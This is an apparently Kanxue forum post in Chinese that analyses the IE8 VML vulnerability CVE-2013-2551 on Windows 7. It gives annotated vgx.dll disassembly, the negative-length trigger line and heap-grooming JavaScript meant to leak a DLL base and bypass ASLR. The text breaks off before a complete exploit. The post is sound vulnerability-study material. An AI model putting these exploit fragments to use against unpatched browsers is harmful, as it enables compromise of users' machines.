
# [原创]Advanced Exploitation Technology-Analyze

中秋佳节，首先祝大家中秋快乐阖家欢！一个人的中秋也是醉了，所有就来看雪发帖啦啦啦！![](https://bbs.kanxue.com/view/img/face/50.gif)

概述：

漏洞：`cve-2013-2551`

环境：`win7 sp1` 无补丁

主要内容：任意地址读写，泄露DLL基址绕过ALSR，控制EIP

这篇分析（再分析）是小弟我学习漏洞分析过程中的心得体会，拿来与和我一样喜欢网络安全的同学分享一下![](https://bbs.kanxue.com/view/img/face/28.gif)

行文简陋，如有不对的地方还望大神们多多指教！

附件为分析文章，已转换为PDF，在这里就不贴出来啦！![](https://bbs.kanxue.com/view/img/face/12.gif)

如果大家想在线看原文的话，也可以访问这里：[06aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6K6i4K6u0W2x3K6j5H3i4K6u0W2j5$3&6Q4x3V1j5K6y4U0m8K6j5h3k6W2i4K6u0r3x3U0l9I4y4q4)9J5c8U0l9&6i4K6u0r3x3o6c8Q4x3V1k6S2k6s2k6S2L8X3y4W2k6q4)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5k6s2c8W2j5$3S2F1L8$3I4G2k6%4W2Q4x3X3c8S2L8X3q4D9P5i4A6W2i4K6u0r3](https://bbs.kanxue.com/elink@a3bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6K6i4K6u0W2x3K6j5H3i4K6u0W2j5$3&6Q4x3V1j5K6y4U0m8K6j5h3k6W2i4K6u0r3x3U0l9I4y4q4)9J5c8U0l9&6i4K6u0r3x3o6c8Q4x3V1k6S2k6s2k6S2L8X3y4W2k6q4)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5k6s2c8W2j5$3S2F1L8$3I4G2k6%4W2Q4x3X3c8S2L8X3q4D9P5i4A6W2i4K6u0r3)

**Advanced Exploitation Technology-Analyze**

作者：tedjoy

微博：5a3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6W2K9h3u0G2i4K6u0W2j5$3!0E0i4K6u0r3N6g2)9J5c8U0t1%4x3U0R3#2x3K6j5H3z5o6t1`.

**自我介绍：**

作为安全界的新人+菜鸟，最近一直在学习分析各种漏洞利用技巧，所以便有了下文。主要是为了给自己留下个总结，同时也可以跟像我一样对网络安全感兴趣的同学分享下自己的学习心得！本人才疏学浅，若有不对的地方还望大神们多多指教，再此感激不尽！

**概述：**

漏洞：`cve-2013-2551`

系统：`win7 + IE8` 无补丁

主要内容：分析如何绕过ASLR，泄露MSVCRT.DLL基址；控制EIP

我们废话少说，开始正题

**漏洞成因简述：**

该漏洞是国外“网络军火商”VUPEN发现的，并在2013年的Pwn2Own上用来攻克win8 + IE10，可以在这里查看VUPEN的blog，可以在这里下载4B5F5F4B大牛分享的poc。

先在这里简单分析下漏洞成因，具体的大家可以去VUPEN的blog自己看看。

VML实现了很多形状标签的子元素，其中有一个 `Stroke` 子元素就是有问题的元素，它有个 `dashstyle`的属性，我们可以对该属性赋值，代码如下：

```
<v:oval>
<v:stroke dashstyle=”2 2 2 0 2 2 2 0″/>
</v:oval>
```

当然也可以用javascript在我们需要的时候对 `dashstyle` 进行动态赋值：

```
<v:oval>
<v:stroke id=”vml1″>
</v:oval>

var vml1 = document.getElementById(“vml1″);
vml1.dashstyle = “11 12 13 15″;
```

由于篇幅关系，我在这里只叙述一下最重要的地方。

在执行
```
vml1.dashstyle = “11 12 13 15″;
```
这条js代码的时候，在`vgx.dll`中的实现过程中有几步如下：

首先会在内存中申请0×10字节的空间，存放`COALineDashStyle`对象，代码如下（以下所有汇编代码的地址包括部分实现代码，由于版本不同可能会不同，但逻辑基本相同）：

```
.text:00485BAD; struct COALineDashStyle *__thiscall COAShapeProg::GetOALineDashStyle()
.text:00485BAD                 mov     edi, edi
……
.text:00485BBE                 push    101h            ; int
.text:00485BC3                 push    10h             ; Size
.text:00485BC5                 call     operator new(uint,int)
.text:00485BCA                 test    eax, eax
.text:00485BCC                 pop     ecx
.text:00485BCD                 pop     ecx
.text:00485BCE                 jz      short loc_485BDD
.text:00485BD0                 push    [ebp+arg_0]     ; struct IInternalPeer *
.text:00485BD3                 mov     ecx, eax        ; this
.text:00485BD5                 push    esi             ; struct COAShapeProg *
.text:00485BD6                 call     COALineDashStyle::COALineDashStyle()
```

接着会开辟内存来存放赋值给 `dashstyle` 属性的数组（在内存中是ORG对象），在这里关心的是该数组所在的内存空间，而不是ORG对象所在的空间，具体原因在后面详细解释

现在在看下`COALineDashStyle` 对象在的方法：

![](https://bbs.kanxue.com/upload/attach/201409/611309_6p9noac7jd7y348.png)

其中有个方法是`get_array()`，我们来看下他的实现：

```
.text:00488C5E ; __int32 __stdcall COALineDashStyle::get_array()
.text:00488C5E                 mov     edi, edi
.text:00488C60                 push    ebp
……
.text:00488CCB ：
.text:00488CCB                 mov     ecx, [esi+4]    ; this
.text:00488CCE                 push    edi             ; struct IInternalPeer *
.text:00488CCF                 call     COAShapeProg::GetOALineDashStyleArray()
```

这里会获取一个`GetOALineDashStyleArray` 对象，我们在来看看这个对象是怎么生成的，进入该函数：

```
.text:0047D779 ; __int32 __stdcall COALineDashStyle::get_presetStyle()
.text:00485BF5                 mov     edi, edi
.text:00485BF7                 push    ebp
.text:00485BF8                 mov     ebp, esp
……
.text:00485C06                 push    101h            ; int
.text:00485C0B                 push    10h             ; Size
.text:00485C0D                 call     operator new(uint,int)
.text:00485C12                 test    eax, eax
.text:00485C14                 pop     ecx
.text:00485C15                 pop     ecx
.text:00485C16                 jz      short loc_485C25
.text:00485C18                 push    [ebp+arg_0]
.text:00485C1B                 mov     ecx, eax
.text:00485C1D                 push    esi
.text:00485C1E                 call    COALineDashStyleArray::COALineDashStyleArray()
```

由以上代码可知`GetOALineDashStyleArray`对象的空间大小也是0×10字节。这里是不是有点什么 :)

以上说了这么多，其实都没有在说漏洞触发的原因，当然肯定是非常有用的正如我前面所说，接下来再看漏洞是如何触发的，触发漏洞代码如下：
```
vml1.dashstyle.array.length = 0 – 1;
```
这里会因为在实现的时候的bug造成整数溢出，具体的在VUPEN的blog上有详细介绍，我就在这里解释下最关键的地方，在对`dashstyle.array.length` 属性赋值的时候，会经过一系列操作，大概过程是会判断原来的array 长度和预期的（新赋值的）长度，本意是如果原长度小于新长度就会再开辟内存空间对array 进行扩展，但是。。。人生中最精彩的就是这个但是了！！！

但是由于实现时的bug，当我们对`array.length` 赋值为一个负数（0xFFFFFFFF）时，会被直接赋值给`array.length` ，但是`array.length` 的定义又是一个 unsigned short，并且在判断的时候会被判断为原长度大于新长度所以不会开辟新的空间，关键代码如下（这部分代码的实现和VUPEN的不同，但逻辑一样）：

```
.text:0047DB3E                 call    dword ptr [eax] ; 返回 ORG对象的地址
.text:0047DB40                 mov     eax, [ebp+this] ; eax 指向ORG对象
.text:0047DB43                 test    eax, eax
.text:0047DB45                 jz      short loc_47DBB8
.text:0047DB47                 mov     ecx, [eax]
.text:0047DB49                 push    eax
.text:0047DB4A                 call    dword ptr [ecx+2Ch] ; 返回数组的长度
.text:0047DB4D                 mov     esi, [ebp+length]
.text:0047DB50                 cmp     eax, esi        ; eax=ORG数组对象的长度，esi=要赋值的新长度0xFFFFFFFF
.text:0047DB52                 jge     short loc_47DBA9 ;跳走触发bug，不跳就会开辟新空间扩展数组
.text:0047DB54                 push    101h            ; int
.text:0047DB59                 sub     esi, eax
.text:0047DB5B                 xor     ecx, ecx
.text:0047DB5D                 push    4
.text:0047DB5F                 pop     edx
.text:0047DB60                 mov     eax, esi
.text:0047DB62                 mul     edx
.text:0047DB64                 seto    cl
.text:0047DB67                 neg     ecx
.text:0047DB69                 or      ecx, eax
.text:0047DB6B                 push    ecx             ; Size
.text:0047DB6C                 operator new(uint,int)
……
.text:0047DBA9 loc_47DBA9:
.text:0047DBA9                 mov     ecx, [ebp+this]
.text:0047DBAC                 mov     edx, [ecx]
.text:0047DBAE                 sub     eax, esi
.text:0047DBB0                 push    eax
.text:0047DBB1                 push    esi
.text:0047DBB2                 push    ecx
.text:0047DBB3                 call    dword ptr [edx+28h] ; 未开辟空间，直接修改长度
```

所有现在就可以越界访问了！！！

**Exploit：

泄露`vgx.dll`地址：**

对于这种类型的神洞，利用思路一般都是先申请大量和漏洞对象相同大小的其他对象，然后释放其中的奇数对象，然后再申请漏洞对象，让其分配这些对象的中间如下：

![](https://bbs.kanxue.com/upload/attach/201409/611309_iigipqlg50vno28.png)

再触发漏洞，越界访问，读出下一个对象的虚表地址，然后就可以泄露该对象虚表所在的DLL的基址了，最后再修改虚表指针，指向我们已经控制的内存（通过heap spraying）区域，当调用该对象虚函数时就可以控制EIP了。

VUPEN的blog里提到了`COAShape::get__anchorRect()` 方法会返回`COAReturnedPointsForAnchor` 对象，大小为0×10字节，如果和精心构造的ORG数组一起就能完成上面的内存布局，但是我在操作的时候怎么都不能将2对象紧密连在一起，代码如下（没有释放奇数堆块，效果是一样的）：

```
for (var i = 0; i < 0×1000; i++) {
a[i] = document.getElementById(“rect” + i.toString())._anchorRect;
if (i == 0xb00 ) {
vml1.dashstyle = “11 12 13 15″;
};
}
```

在`COAReturnedPointsForAnchor` 对象和ORG对象之间总有其他对象（后来才发现这是`COAShape`对象，它的大小也固定为0×10字节，越界访问该对象也是可以的，不过这是后话了），对于我这种有强迫症的人来说这是不可容忍的，为了更具有“稳定性”，于是我就想到了上文提到的2个对象`COALineDashStyle`和`GetOALineDashStyleArray`，因为在每次生成ORG数组的时候都会按照上面提到的流程，在内存开辟3段空间来存放`COALineDashStyle`，ORG, `GetOALineDashStyleArray`，而且`COALineDashStyle`和`GetOALineDashStyleArray`得大小都为0×10字节，所以我可以让ORG数组大小也为0×10字节，这样就能让他们在内存空间依次连续。当然首先我先申请大量的`COAReturnedPointsForAnchor`，简单来说就是为了消耗内存碎片，确保关键对象能在内存连续布局，代码如下：

```
for (var i = 0; i < 0×1000; i++) {
a[i] = document.getElementById(“rect” + i.toString())._anchorRect;
}
vml1.dashstyle = “11 12 13 15″;
```

经测试后发现确实可行，内存布局如下：
